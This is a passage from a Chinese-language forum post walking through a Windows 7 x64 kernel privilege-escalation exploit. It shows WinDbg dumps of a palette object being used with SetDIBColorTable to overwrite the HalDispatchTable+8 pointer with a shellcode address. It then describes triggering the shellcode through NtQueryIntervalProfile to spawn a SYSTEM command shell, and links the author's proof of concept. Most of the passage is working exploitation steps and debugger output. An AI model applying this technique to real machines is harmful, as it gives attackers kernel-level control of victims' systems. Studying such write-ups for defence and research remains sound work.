
```text
kd> dq FFFFF900c3041cc0+78h

//看到xp=00000000`020f0d50

fffff900`c3041d38  00000000`020f0d50 12344444`00081234

fffff900`c3041d48  00081234`44440008 44440008`12344444

fffff900`c3041d58  12344444`00081234 00081234`44440008

fffff900`c3041d68  44440008`12344444 12344444`00081234

kd> dq  00000000`020f0d50+80h

//这里指定的就是hal地址

00000000`020c0dd0  fffff800`03e43c68 00000000`001dbb18

00000000`020c0de0  00000000`00000000 00000000`fdfdfdfd

00000000`020c0df0  00000000`00000000 0c1d2361`21bb903c

00000000`020c0e00  00000000`020c0d20 00000000`00000000

kd> dq  fffff800`03e43c68 

//原值为fffff800`00000000

fffff800`03e43c68  fffff800`00000000 fffff800`03c43470

fffff800`03e43c78  fffff800`04041f20 00000000`00000000

fffff800`03e43c88  fffff800`03d1c2f0 fffff800`03ff4044

fffff800`03e43c98  fffff800`03ff4990 fffff800`041310d0

fffff800`03e43ca8  fffff800`03d00090 fffff800`03cc4510

fffff800`03e43cb8  fffff800`03cc4510 fffff800`03c41ca4

fffff800`03e43cc8  fffff800`03c42e88 fffff800`03c17534

fffff800`03e43cd8  fffff800`03c41c18 fffff800`04041f20
```

继续运行程序至以下代码，然后在用户态查看：

执行 `*(LONGLONG *)(XEPALOBJ + 0x80) = (LONGLONG)(hal + 8);`

`SetDIBColorTable(hdc, 0, 1, &prgbq)` 后，执行 `dv /i /t /v`：

```text
//dal地址
prv local  00000000`001df9f8 unsigned int64 hal = 0xfffff800`03e43c60

//shellcode地址
prv local  00000000`001dfa00 unsigned int64 target = 0x00000001`3fe7123a
```

再回到内核态查看：

```text
kd> dq  00000000`020f0d50+80h

00000000`020c0dd0  fffff800`03e43c68 00000000`001dbb18

00000000`020c0de0  00000000`00000000 00000000`fdfdfdfd

00000000`020c0df0  00000000`00000000 0c1d2361`21bb903c

00000000`020c0e00  00000000`020c0d20 00000000`00000000

kd> dq fffff800`03e43c68

//新值已经被修改成target地址也就是shellcode地址

fffff800`03e43c68  00000001`3fe7123a fffff800`03c43470

fffff800`03e43c78  fffff800`04041f20 00000000`00000000

fffff800`03e43c88  fffff800`03d1c2f0 fffff800`03ff4044

fffff800`03e43c98  fffff800`03ff4990 fffff800`041310d0
```

此时可以看到 `hal` 地址 +8 位置的内存数据已经被修改成 `target` 地址，也就是 shellcode 地址。

接下去调用 `NtQueryIntervalProfile` 执行 `eshellcode`，最后成功在 win7x64 机器上弹出 system 的 `cmd`，经测试成功率在 50% 左右，如图：

![图](https://bbs.kanxue.com/upload/attach/201907/609565_6BAZKF89NN2C33F.png)

> 引用

[我的poc地址](<https://bbs.kanxue.com/elink@751K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0W2Q4x3X3b7H3z5o6l9K6>)

作者来自 ZheJiang Guoli Security Technology

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2019-8-9 09:01 被王cb编辑，原因：
